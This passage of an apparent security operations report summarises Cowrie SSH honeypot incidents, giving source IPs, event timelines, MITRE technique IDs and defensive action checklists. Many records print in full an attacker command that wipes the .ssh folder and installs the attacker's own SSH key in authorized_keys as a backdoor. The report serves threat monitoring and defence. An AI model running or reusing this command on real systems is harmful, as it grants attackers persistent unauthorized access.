| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:40:39` | `cowrie.session.connect` |
| `2026-05-23 17:40:39` | `cowrie.client.version` |
| `2026-05-23 17:40:39` | `cowrie.client.kex` |
| `2026-05-23 17:40:39` | `cowrie.login.success` |
| `2026-05-23 17:40:40` | `cowrie.session.params` |
| `2026-05-23 17:40:40` | `cowrie.command.input` |
| `2026-05-23 17:40:40` | `cowrie.command.failed` |
| `2026-05-23 17:40:40` | `cowrie.log.closed` |
| `2026-05-23 17:40:40` | `cowrie.session.params` |
| `2026-05-23 17:40:40` | `cowrie.command.input` |
| `2026-05-23 17:40:40` | `cowrie.session.file_download` |
| `2026-05-23 17:40:40` | `cowrie.log.closed` |
| `2026-05-23 17:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e651fc95a8c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:40 |
| **Last Seen** | 2026-05-23 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:40:42` | `cowrie.session.connect` |
| `2026-05-23 17:40:42` | `cowrie.client.version` |
| `2026-05-23 17:40:42` | `cowrie.client.kex` |
| `2026-05-23 17:40:42` | `cowrie.login.success` |
| `2026-05-23 17:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ad42920c45

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:42 |
| **Last Seen** | 2026-05-23 17:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:42:19` | `cowrie.session.connect` |
| `2026-05-23 17:42:19` | `cowrie.client.version` |
| `2026-05-23 17:42:19` | `cowrie.client.kex` |
| `2026-05-23 17:42:19` | `cowrie.login.success` |
| `2026-05-23 17:42:20` | `cowrie.session.params` |
| `2026-05-23 17:42:20` | `cowrie.command.input` |
| `2026-05-23 17:42:20` | `cowrie.command.failed` |
| `2026-05-23 17:42:20` | `cowrie.log.closed` |
| `2026-05-23 17:42:20` | `cowrie.session.params` |
| `2026-05-23 17:42:20` | `cowrie.command.input` |
| `2026-05-23 17:42:20` | `cowrie.session.file_download` |
| `2026-05-23 17:42:20` | `cowrie.log.closed` |
| `2026-05-23 17:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61435d8e30d9

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:42 |
| **Last Seen** | 2026-05-23 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:42:23` | `cowrie.session.connect` |
| `2026-05-23 17:42:23` | `cowrie.client.version` |
| `2026-05-23 17:42:24` | `cowrie.client.kex` |
| `2026-05-23 17:42:24` | `cowrie.login.success` |
| `2026-05-23 17:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3424bf4003b

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:46 |
| **Last Seen** | 2026-05-23 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:46:20` | `cowrie.session.connect` |
| `2026-05-23 17:46:20` | `cowrie.client.version` |
| `2026-05-23 17:46:20` | `cowrie.client.kex` |
| `2026-05-23 17:46:21` | `cowrie.login.success` |
| `2026-05-23 17:46:21` | `cowrie.session.params` |
| `2026-05-23 17:46:21` | `cowrie.command.input` |
| `2026-05-23 17:46:21` | `cowrie.command.failed` |
| `2026-05-23 17:46:21` | `cowrie.log.closed` |
| `2026-05-23 17:46:22` | `cowrie.session.params` |
| `2026-05-23 17:46:22` | `cowrie.command.input` |
| `2026-05-23 17:46:22` | `cowrie.session.file_download` |
| `2026-05-23 17:46:22` | `cowrie.log.closed` |
| `2026-05-23 17:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc3b48478b2

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:46 |
| **Last Seen** | 2026-05-23 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:46:25` | `cowrie.session.connect` |
| `2026-05-23 17:46:25` | `cowrie.client.version` |
| `2026-05-23 17:46:25` | `cowrie.client.kex` |
| `2026-05-23 17:46:26` | `cowrie.login.success` |
| `2026-05-23 17:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e00593915a35

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:50 |
| **Last Seen** | 2026-05-23 17:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:50:19` | `cowrie.session.connect` |
| `2026-05-23 17:50:19` | `cowrie.client.version` |
| `2026-05-23 17:50:19` | `cowrie.client.kex` |
| `2026-05-23 17:50:19` | `cowrie.login.success` |
| `2026-05-23 17:50:20` | `cowrie.session.params` |
| `2026-05-23 17:50:20` | `cowrie.command.input` |
| `2026-05-23 17:50:20` | `cowrie.command.failed` |
| `2026-05-23 17:50:20` | `cowrie.log.closed` |
| `2026-05-23 17:50:20` | `cowrie.session.params` |
| `2026-05-23 17:50:20` | `cowrie.command.input` |
| `2026-05-23 17:50:20` | `cowrie.session.file_download` |
| `2026-05-23 17:50:20` | `cowrie.log.closed` |
| `2026-05-23 17:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-586dbce3ffbe

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:50 |
| **Last Seen** | 2026-05-23 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:50:26` | `cowrie.session.connect` |
| `2026-05-23 17:50:26` | `cowrie.client.version` |
| `2026-05-23 17:50:27` | `cowrie.client.kex` |
| `2026-05-23 17:50:27` | `cowrie.login.success` |
| `2026-05-23 17:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295e82cc3390

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:58 |
| **Last Seen** | 2026-05-23 17:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:58:26` | `cowrie.session.connect` |
| `2026-05-23 17:58:26` | `cowrie.client.version` |
| `2026-05-23 17:58:26` | `cowrie.client.kex` |
| `2026-05-23 17:58:27` | `cowrie.login.success` |
| `2026-05-23 17:58:27` | `cowrie.session.params` |
| `2026-05-23 17:58:27` | `cowrie.command.input` |
| `2026-05-23 17:58:27` | `cowrie.command.failed` |
| `2026-05-23 17:58:28` | `cowrie.log.closed` |
| `2026-05-23 17:58:28` | `cowrie.session.params` |
| `2026-05-23 17:58:28` | `cowrie.command.input` |
| `2026-05-23 17:58:28` | `cowrie.session.file_download` |
| `2026-05-23 17:58:28` | `cowrie.log.closed` |
| `2026-05-23 17:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97ee3fd8d2df

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 17:58 |
| **Last Seen** | 2026-05-23 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:58:30` | `cowrie.session.connect` |
| `2026-05-23 17:58:30` | `cowrie.client.version` |
| `2026-05-23 17:58:30` | `cowrie.client.kex` |
| `2026-05-23 17:58:31` | `cowrie.login.success` |
| `2026-05-23 17:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc86673c4f0

| Field | Detail |
|---|---|
| **Source IP** | `180.93.3[.]33` |
| **First Seen** | 2026-05-23 18:02 |
| **Last Seen** | 2026-05-23 18:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:02:22` | `cowrie.session.connect` |
| `2026-05-23 18:02:22` | `cowrie.client.version` |
| `2026-05-23 18:02:22` | `cowrie.client.kex` |
| `2026-05-23 18:02:22` | `cowrie.login.success` |
| `2026-05-23 18:02:22` | `cowrie.session.params` |
| `2026-05-23 18:02:22` | `cowrie.command.input` |
| `2026-05-23 18:02:22` | `cowrie.command.failed` |
| `2026-05-23 18:02:23` | `cowrie.log.closed` |
| `2026-05-23 18:02:23` | `cowrie.session.params` |
| `2026-05-23 18:02:23` | `cowrie.command.input` |
| `2026-05-23 18:02:23` | `cowrie.session.file_download` |
| `2026-05-23 18:02:23` | `cowrie.log.closed` |
| `2026-05-23 18:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.3[.]33` to AbuseIPDB if not already reported
- [ ] Block `180.93.3[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4e93d35ac9

| Field | Detail |
|---|---|
| **Source IP** | `180.93.3[.]33` |
| **First Seen** | 2026-05-23 18:02 |
| **Last Seen** | 2026-05-23 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:02:25` | `cowrie.session.connect` |
| `2026-05-23 18:02:25` | `cowrie.client.version` |
| `2026-05-23 18:02:25` | `cowrie.client.kex` |
| `2026-05-23 18:02:25` | `cowrie.login.success` |
| `2026-05-23 18:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.3[.]33` to AbuseIPDB if not already reported
- [ ] Block `180.93.3[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c7769dc584

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:02 |
| **Last Seen** | 2026-05-23 18:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:02:29` | `cowrie.session.connect` |
| `2026-05-23 18:02:29` | `cowrie.client.version` |
| `2026-05-23 18:02:29` | `cowrie.client.kex` |
| `2026-05-23 18:02:30` | `cowrie.login.success` |
| `2026-05-23 18:02:31` | `cowrie.session.params` |
| `2026-05-23 18:02:31` | `cowrie.command.input` |
| `2026-05-23 18:02:31` | `cowrie.command.failed` |
| `2026-05-23 18:02:31` | `cowrie.log.closed` |
| `2026-05-23 18:02:32` | `cowrie.session.params` |
| `2026-05-23 18:02:32` | `cowrie.command.input` |
| `2026-05-23 18:02:32` | `cowrie.session.file_download` |
| `2026-05-23 18:02:32` | `cowrie.log.closed` |
| `2026-05-23 18:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51339f510a28

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:02 |
| **Last Seen** | 2026-05-23 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:02:35` | `cowrie.session.connect` |
| `2026-05-23 18:02:35` | `cowrie.client.version` |
| `2026-05-23 18:02:35` | `cowrie.client.kex` |
| `2026-05-23 18:02:36` | `cowrie.login.success` |
| `2026-05-23 18:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db41d758e0c2

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:06 |
| **Last Seen** | 2026-05-23 18:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:06:35` | `cowrie.session.connect` |
| `2026-05-23 18:06:35` | `cowrie.client.version` |
| `2026-05-23 18:06:35` | `cowrie.client.kex` |
| `2026-05-23 18:06:36` | `cowrie.login.success` |
| `2026-05-23 18:06:37` | `cowrie.session.params` |
| `2026-05-23 18:06:37` | `cowrie.command.input` |
| `2026-05-23 18:06:37` | `cowrie.command.failed` |
| `2026-05-23 18:06:38` | `cowrie.log.closed` |
| `2026-05-23 18:06:38` | `cowrie.session.params` |
| `2026-05-23 18:06:38` | `cowrie.command.input` |
| `2026-05-23 18:06:38` | `cowrie.session.file_download` |
| `2026-05-23 18:06:38` | `cowrie.log.closed` |
| `2026-05-23 18:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd36b7ef3b2a

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:06 |
| **Last Seen** | 2026-05-23 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:06:41` | `cowrie.session.connect` |
| `2026-05-23 18:06:41` | `cowrie.client.version` |
| `2026-05-23 18:06:42` | `cowrie.client.kex` |
| `2026-05-23 18:06:43` | `cowrie.login.success` |
| `2026-05-23 18:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60710b88a8c

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:07 |
| **Last Seen** | 2026-05-23 18:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:07:38` | `cowrie.session.connect` |
| `2026-05-23 18:07:38` | `cowrie.client.version` |
| `2026-05-23 18:07:38` | `cowrie.client.kex` |
| `2026-05-23 18:07:38` | `cowrie.login.success` |
| `2026-05-23 18:07:39` | `cowrie.session.params` |
| `2026-05-23 18:07:39` | `cowrie.command.input` |
